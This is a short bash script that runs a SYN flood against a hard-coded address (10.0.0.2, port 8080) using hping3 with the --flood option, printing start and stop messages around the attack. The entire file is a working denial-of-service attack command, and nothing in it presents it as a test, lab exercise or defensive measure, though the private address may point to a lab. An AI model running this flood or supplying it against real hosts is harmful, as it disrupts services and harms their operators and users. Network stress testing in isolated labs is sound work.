#!/usr/bin/env bash

TARGET_IP="10.0.0.2"
TARGET_PORT="8080"

echo "[*] Starting SYN flood traffic to ${TARGET_IP}:${TARGET_PORT}"
echo "[*] Press Ctrl+C to stop"

hping3 -S -p "${TARGET_PORT}" --flood "${TARGET_IP}"
